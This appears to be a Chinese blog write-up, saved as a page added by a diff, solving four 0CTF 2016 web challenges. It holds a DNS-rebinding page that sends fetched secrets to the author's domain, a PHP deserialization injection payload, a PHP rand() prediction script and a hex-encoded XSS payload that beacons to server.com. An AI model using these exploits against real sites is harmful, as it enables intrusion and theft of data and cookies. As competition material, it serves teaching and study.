@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="content-language" content="zh-cn">
+    <title>0ctf部分write up - virusdefender's blog (＾－＾)V</title>
+    <link rel="shortcut icon" href="/assets/img/favicon.ico">
+    <meta name="author"  content="virusdefender">
+    <meta name="description" content=" 学而不思则罔，思而不学则殆">
+    <meta name="keywords"  content="virusdefender,blog">
+    <!-- Open Graph -->
+    <meta property="og:title" content="0ctf部分write up - virusdefender's blog (＾－＾)V">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://strcpy.me/index.php/archives/685/">
+    <meta property="og:description" content=" 学而不思则罔，思而不学则殆">
+    <meta property="og:site_name" content="virusdefender's blog (＾－＾)V">
+    <link rel="stylesheet" href="//cdn.staticfile.org/normalize/6.0.0/normalize.min.css">
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_roc50gemkxpw4s4i.css">
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/prism.css">
+    <link rel="stylesheet" href="/assets/css/app.min.css">
+    <link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="https://strcpy.me/feed/" />
+</head>
+
+<body>
+    <!--[if lt IE 10]>
+<div class="alert-danger" role="alert">你的浏览器实在太太太旧了，放学别走，升级完浏览器再说！<a target="_blank" class="alert-link" href="http://browsehappy.com">立即升级</a></div>
+<![endif]-->
+    <header class="g-header">
+    <div class="g-logo">
+        <a href="/">virusdefender's blog (＾－＾)V</a>
+    </div>
+    <i id="menu-toggle" class="iconfont icon-menu"></i>
+    <nav class="g-nav">
+        <ul>
+            
+            <li><a href="/">home</a></li>
+            
+            <li><a href="http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm">law</a></li>
+            
+            <li><a href="/index.php/archives/about/">about</a></li>
+            
+        </ul>
+    </nav>
+</header>
+
+
+<header class="g-banner post-header post-pattern-circuitBoard bgcolor-default post-no-cover" data-theme="default">
+    <div class="post-wrapper">
+        <div class="post-tags">
+             
+            
+            <a href="/tags/#安全" class="post-tag">安全</a>
+            
+            <a href="/tags/#CTF" class="post-tag">CTF</a>
+            
+            
+        </div>
+        <h1>0ctf部分write up</h1>
+        <div class="post-meta">
+            <time class="post-meta-item" datetime="2016-03-14 03:03"><i class="iconfont icon-date"></i>2016-03-14 03:03</time>
+        </div>
+    </div>
+</header>
+
+<div class="post-content">
+    
+    <article class="markdown-body">
+        <p>首先不得不说这场比赛题目水平还是相当相当高的，毕竟是0ops团队。</p>
+
+<h2 id="monkey">Monkey</h2>
+<blockquote>
+  <p>What is Same Origin Policy?</p>
+</blockquote>
+
+<blockquote>
+  <p>The flag is at http://127.0.0.1:8080/secret After you submitted a url, a monkey will browse the url. The monkey will stay 2 minutes on your page. 
+Try to find a string $str so that (substr(md5($str), 0, 6) === ‘54d7ed’).</p>
+</blockquote>
+
+<p>首先这个题要计算md5，每次刷新页面都会变的，其实6位的md5组合并不多，理论上是$16^6$个，所以先计算出一些，保存起来，每次到文件中查找就好了。</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1000000000</span><span class="p">):</span>
+    <span class="k">print</span> <span class="n">i</span><span class="p">,</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+</code></pre>
+</div>
+
+<p>算了一会，觉得差不多了，就停了下来，生成了大约2G的文件。查询md5的时候，就使用<code class="highlighter-rouge">cat md5.txt|grep xxxx</code>。</p>
+
+<p>然后下面域名随便写了自己的一个域名，查看log确实会有一个访问，UA是<code class="highlighter-rouge">Mozilla/5.0 0ctf by md5_salt</code>，但是题目上是要访问127.0.0.1才行。</p>
+
+<p>如果将自己的页面上加入js ajax访问127.0.0.1，会因为同源策略被拦截，访问失败。如果想跨域发送请求，需要对方网站设置<code class="highlighter-rouge">Access-Control-Allow-Origin</code>，但是没办法收到响应。</p>
+
+<p>现在唯一能控制的就是自己的域名，能不能让自己的域名在爬虫访问的时候是正常的ip，然后js执行的时候变成127.0.0.1呢，这样域名仍然是不变的既可以跨域了。</p>
+
+<p>后来在提示下找到了<a href="https://crypto.stanford.edu/dns/">DNS Rebinding</a>这个方法，页面加载后使用<code class="highlighter-rouge">setTimeout</code>增加js执行时间，然后在这个过程中修改域名解析到127.0.0.1，这个就要求DNS的TTL要尽可能的小，才能尽快的生效，一直在用的CloudXNS可以设置60s的TTL，已经足够了。</p>
+
+<!--more-->
+
+<p>服务器上的页面是这样的</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>/* 这个http头是为了接收js跨域报告访问结果设置的，和题目没太大关系。js如果不是使用ajax报告结果，而是`new Image().src`的形式也可以，就可以无视跨域问题了。*/
+
+<span class="cp">&lt;?php</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">"Access-Control-Allow-Origin: *"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"//cdn.bootcss.com/jquery/1.12.1/jquery.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;script&gt;</span>
+<span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+    <span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+        <span class="na">url</span><span class="p">:</span> <span class="s2">"http://ctf.qduoj.com:8080/secret"</span><span class="p">,</span>
+        <span class="na">method</span><span class="p">:</span> <span class="s2">"get"</span><span class="p">,</span>
+        <span class="na">success</span><span class="p">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">$</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">"http://ctf1.qduoj.com:8080/123?"</span> <span class="o">+</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">stringfy</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+        <span class="p">}</span> 
+<span class="p">},</span> <span class="mi">100000</span><span class="p">);</span>
+ 
+<span class="nt">&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre>
+</div>
+
+<p>整体流程就是</p>
+
+<ul>
+  <li>设置ctf和ctf1域名都指向服务器正常ip</li>
+  <li>题目页面提交ctf域名让爬虫访问</li>
+  <li>修改ctf域名指向127.0.0.1，TTL 60s</li>
+  <li>100秒之后查看日志</li>
+</ul>
+
+<p>最终得到了flag <code class="highlighter-rouge">0ctf{monkey_likes_banananananananaaaa}</code></p>
+
+<h2 id="piapiapia">piapiapia</h2>
+<p>代码审计题目，源码在在<a href="https://dn-virusdefender-blog.qbox.me/2016/2448463110.zip">这里</a></p>
+
+<p>翻看了一下，看到了反序列化，心中一惊，但是仔细看的话，只有array中的一项是可以被控制的，就是nickname，如果传递了nickname[]数组，在正则验证和判断长度的时候，就成了判断<code class="highlighter-rouge">array</code>这个字符串了，是唯一可以带进数据的地方。但是又想，这里不管带进去什么都是字符串的状态啊，不会影响序列化之后的数据。如果能控制头像是<code class="highlighter-rouge">config.php</code>就可以读取到flag了。</p>
+
+<p>序列化出来的数据就是<code class="highlighter-rouge">a:4:{s:5:"phone";s:11:"13888888888";s:5:"email";s:10:"xxx@qq.com";s:8:"nickname";a:1:{i:0;s:4:"test";}s:5:"photo";s:10:"upload/xxx";}</code></p>
+
+<p>我们期望的是<code class="highlighter-rouge">a:4:{s:5:"phone";s:11:"13888888888";s:5:"email";s:10:"xxx@qq.com";s:8:"nickname";a:1:{i:0;s:4:"test";}s:5:"photo";s:10:"config.php";}</code></p>
+
+<p>可以通过插入nickname破坏原有结构</p>
+
+<blockquote>
+  <p>a:4:{s:5:”phone”;s:11:”13888888888”;s:5:”email”;s:10:”xxx@qq.com”;s:8:”nickname”;a:1:{i:0;s:4:”<code class="highlighter-rouge">test";}s:5:"photo";s:10:"config.php";}</code>”;}s:5:”photo”;s:10:”config.php”;}</p>
+</blockquote>
+
+<p>代码高亮部分就是想插入的nicknane的值，但是实际生成的序列化结果”test”前面的肯定不是<code class="highlighter-rouge">s:4</code>了，长度就是实际的长度，然并卵。</p>
+
+<p>然后注意到数据库查询部分有一个filter，会把部分关键词替换成hacker这个字符串。</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code>public function filter($string) {
+    $escape = array('\'', '\\\\');
+    $escape = '/' . implode('|', $escape) . '/';
+    $string = preg_replace($escape, '_', $string);
+
+    $safe = array('select', 'insert', 'update', 'delete', 'where');
+    $safe = '/' . implode('|', $safe) . '/i';
+    return preg_replace($safe, 'hacker', $string);
+}
+</code></pre>
+</div>
+
+<p>所以可以考虑利用这个过滤器修改序列化之后的数据，就是前面增加一些where，在序列化的时候是正确的，但是写入数据库的时候，where被替换成了hacker，字符长度多了一个，这样反序列化的时候，php就会在之前的数据前面读取完成，接下来就是另外一个字段了，也就是我们可以控制的数据部分。</p>
+
+<p>前面增加的where个数就应该是我们的payload的长度31，生成的序列化数据就是<code class="highlighter-rouge">a:4:{s:5:"phone";s:11:"13888888888";s:5:"email";s:10:"xxx@qq.com";s:8:"nickname";a:1:{i:0;s:186:"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:10:"config.php";}</code></p>
+
+<p>然后经过替换就成了<code class="highlighter-rouge">a:4:{s:5:"phone";s:11:"13888888888";s:5:"email";s:10:"xxx@qq.com";s:8:"nickname";a:1:{i:0;s:186:"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker";}s:5:"photo";s:10:"config.php";}s:5:"photo";s:10:"config.php";}</code></p>
+
+<p>这样php解析s:186的时候就正好把所有的hacker读取完了，得到nickname是186的长度，接下来解析的s:5就是我们控制的数据了。</p>
+
+<h2 id="rand_2">rand_2</h2>
+<p>这道题虽然只有2分，但是一点都不简单。</p>
+
+<p>题目给出了源码，</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">include</span><span class="p">(</span><span class="s1">'config.php'</span><span class="p">);</span>
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'time'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nb">time</span><span class="p">()</span> <span class="o">-</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'time'</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">60</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">session_destroy</span><span class="p">();</span>
+    <span class="k">die</span><span class="p">(</span><span class="s1">'timeout'</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'time'</span><span class="p">]</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">echo</span> <span class="nb">rand</span><span class="p">();</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'go'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'rand'</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="nv">$i</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+    <span class="nv">$d</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+    <span class="k">while</span><span class="p">(</span><span class="nv">$i</span><span class="o">--</span><span class="p">){</span>
+        <span class="nv">$r</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">rand</span><span class="p">();</span>
+        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'rand'</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$r</span><span class="p">;</span>
+        <span class="nv">$d</span> <span class="o">.=</span> <span class="nv">$r</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">echo</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'check'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'check'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'rand'</span><span class="p">])</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s1">'die'</span><span class="p">;</span>
+        <span class="nb">session_destroy</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nb">show_source</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+<p>简单看来就预测伪随机数，不可能去暴力，时间复杂度太高了，而且session只能用一分钟。这道题要从随机数实现说起。</p>
+
+<p>php的随机数是直接使用了glibc的函数，glibc默认是使用线性反馈算法(linear additive feedback method)来得到随机数。根据 http://www.mscs.dal.ca/~selinger/random/ ，这个算法实现过程是</p>
+
+<ul>
+  <li>$r_0 = s$</li>
+  <li>$r_i = (16807 \times\ (signed\ int)\ r_i - 1)\ mod\ 2147483647\ (for\ i = 1…30)$</li>
+  <li>$r_i = r_{i-31}\ (for\ i = 31…33)$</li>
+  <li>$r_i = (r_{i-3} + r_{i-31})\ mod\ 4294967296\ (for\ i ≥ 34)$</li>
+  <li>$r_0到r_{343}$的结果算是基数，第i次调用rand()函数的输出是$o_i = r_{i+344} » 1$</li>
+</ul>
+
+<p>用c语言实现代码是</p>
+<pre><code class="language-clike">#include &lt;stdio.h&gt;
+
+#define MAX 1000
+#define seed 1
+
+int main() {
+    int r[MAX];
+    int i;
+
+    r[0] = seed;
+    for (i = 1; i &lt; 31; i++) {
+        r[i] = (16807LL * r[i - 1]) % 2147483647;
+        if (r[i] &lt; 0) {
+            r[i] += 2147483647;
+        }
+    }
+    for (i = 31; i &lt; 34; i++) {
+        r[i] = r[i - 31];
+    }
+    for (i = 34; i &lt; 344; i++) {
+        r[i] = r[i - 31] + r[i - 3];
+    }
+    for (i = 344; i &lt; MAX; i++) {
+        r[i] = r[i - 31] + r[i - 3];
+        printf("%d\n", ((unsigned int) r[i]) &gt;&gt; 1);
+    }
+    return 0;
+}
+
+</code></pre>
+
+<p>这样看来，在种子不变的情况下，已知前面的随机数输出，是可以直接得到后面的随机数的，使用php和Python验证了一下。</p>
+
+<div class="language-php highlighter-rouge"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$i</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
+<span class="k">while</span><span class="p">(</span><span class="nv">$i</span><span class="o">--</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">echo</span> <span class="nb">rand</span><span class="p">();</span>
+    <span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre>
+</div>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"php_rand.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
+<span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span> <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()]</span>
+
+<span class="n">i</span> <span class="o">=</span> <span class="mi">60</span>
+<span class="n">b</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">31</span><span class="p">])</span> <span class="o">%</span> <span class="mi">2147483648</span>
+<span class="k">print</span> <span class="n">b</span><span class="p">,</span> <span class="n">a</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
+</code></pre>
+</div>
+
+<p>所以题目的思路就是获取一些随机数，连续请求重试，只要是中间不生成新的随机数就可以。</p>
+
+<p>代码参考 http://www.isecer.com/ctf/0ctf_2016_web_writeup_rand_2.html</p>
+
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="n">l</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="c"># 获取50个随机rand值并存入list</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
+        <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://202.120.7.202:8888/'</span><span class="p">)</span>
+        <span class="n">l</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">[:</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">'&lt;'</span><span class="p">)]))</span>
+    <span class="c">#将$_SESSION['rand']这个数组写满5个随机数</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://202.120.7.202:8888/?go'</span><span class="p">)</span>
+    <span class="c">#获取将MD5之前的rand随机数存到list</span>
+    <span class="n">l</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">[:</span><span class="o">-</span><span class="mi">32</span><span class="p">]))</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s">'http://202.120.7.202:8888/?'</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+        <span class="n">end</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+        <span class="c">#由随机数生成算法预测下一个随机数</span>
+        <span class="n">randNUM</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="p">[</span><span class="n">end</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="n">l</span><span class="p">[</span><span class="n">end</span><span class="o">-</span><span class="mi">31</span><span class="p">])</span> <span class="o">%</span> <span class="mi">2147483648</span> 
+        <span class="n">l</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">randNUM</span><span class="p">)</span><span class="c">#将新生成的也加入到列表里</span>
+        <span class="c">#构造url 传入数组5个预测rand随机数</span>
+        <span class="n">url</span> <span class="o">+=</span> <span class="s">'check[]={}&amp;'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">randNUM</span><span class="p">)</span>
+    <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="c">#GET请求url 同时传入参数</span>
+    <span class="c">#如果输出不是 die 大功告成</span>
+    <span class="k">if</span> <span class="s">'die'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+        <span class="k">print</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span>
+        <span class="k">break</span>
+</code></pre>
+</div>
+
+<h2 id="guest-book1">guest book1</h2>
+<p>这个题利用了chrome浏览器的两个特点，还是相当好的题目。</p>
+
+<ul>
+  <li>使用chrome xss filter使部分js失效（和alictf一个题目类似，参考 http://linux.im/2015/03/29/alictf-2015-xss400.html）
+<img src="http://storage.virusdefender.net/blog/images/685/3.png" alt="QQ20160315-1@2x.png" /></li>
+</ul>
+
+<p>如果url是<code class="highlighter-rouge">/ctf/test.html?a=%3Cscript%3Evar%20debug=false;%3C/script%3E</code></p>
+
+<p><img src="http://storage.virusdefender.net/blog/images/685/4.png" alt="QQ20160315-2@2x.png" /></p>
+<ul>
+  <li>dom中存在对应的id的元素的时候，如果js中没有定义的这个变量，那这个变量就是dom节点
+<img src="http://storage.virusdefender.net/blog/images/685/5.png" alt="chrome-dom.png" /></li>
+</ul>
+
+<p>因为显示页面的代码如下，其中<code class="highlighter-rouge">$MESSAGE</code>会被去掉尖括号、引号等</p>
+
+<div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="kd">var</span> <span class="nx">debug</span><span class="o">=</span><span class="kc">false</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">div</span> <span class="nx">id</span><span class="o">=</span><span class="s2">"$USERNAME"</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="nx">h2</span><span class="o">&gt;</span><span class="nx">$USERNAME</span><span class="o">&lt;</span><span class="sr">/h2</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="sr">/div</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">div</span> <span class="nx">id</span><span class="o">=</span><span class="s2">"text"</span><span class="o">&gt;&lt;</span><span class="sr">/div</span><span class="err">&gt;
+</span><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+    <span class="nx">data</span> <span class="o">=</span> <span class="s2">"$MESSAGE"</span>
+    <span class="nx">t</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"text"</span><span class="p">)</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">debug</span><span class="p">){</span>
+        <span class="nx">t</span><span class="p">.</span><span class="nx">innerHTML</span><span class="o">=</span><span class="nx">data</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="nx">t</span><span class="p">.</span><span class="nx">innerText</span><span class="o">=</span><span class="nx">data</span>
+    <span class="p">}</span>
+<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre>
+</div>
+
+<p>所以需要</p>
+<ul>
+  <li>url带上<script>var debug=false;</script>，可控的就是secret</li>
+  <li><code class="highlighter-rouge">$USERNAME</code>写<code class="highlighter-rouge">debug</code></li>
+  <li><code class="highlighter-rouge">$MESSAGE</code>使用十六进制编码，绕过过滤，因为输入在js变量中，所以js会自动转义的。比如<code class="highlighter-rouge">&lt;img src=x onerror="(new(Image)).src='http://server.com/xxx/'&gt;</code>需要转义为<code class="highlighter-rouge">\x3cimg src=x onerror=\x22(new(Image)).src=\x27http://server.com/xxx/\x27\x3e</code></li>
+</ul>
+
+<p>xss成功，可以看到一次访问，referer是<code class="highlighter-rouge">http://127.0.0.1:8888/admin/show.php</code>，但是没有cookies，题目说flag在cookie里面，而cookie是http only的，怎么去获取呢？</p>
+
+<p>用js尝试获取了一下<code class="highlighter-rouge">admin/show.php</code>的html，也就是<code class="highlighter-rouge">document.getElementsByTagName("html")</code>，发现页面有提示，就又访问了一个phpinfo页面获取到了flag。</p>
+
+
+
+        <section class="author-detail">
+            <section class="post-footer-item comment">
+                <a href="/comment.html?title=0ctf部分write up&article_id=/index.php/archives/685/" target="_blank">评论</a> | <a href="#" onclick="document.getElementById('wx-pay').style.display = ''; return false;">微信打赏</a> | 转载必须注明原文链接
+            </section>
+            <img src="https://storage.virusdefender.net/blog/images/utils/wx_pay_new.JPG" style="max-width: 90%;max-height: 90%; display: none;" id="wx-pay">
+        </section>
+    </article>
+</div>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?e5ec0a55646c7c7c90dc530c56c80171";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<footer class="g-footer">
+    <section>virusdefender's blog (＾－＾)V © 2019</section>
+    <section>Powered by <a href="//jekyllrb.com">Jekyll</a> | <a href="https://github.com/kaeyleo/jekyll-theme-H2O">Theme H2O</a></section>
+</footer>
+
+
+    <script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"></script>
+    <script src="/assets/js/prism.js"></script>
+    <script src="/assets/js/index.min.js"></script>
+</body>
+</html>
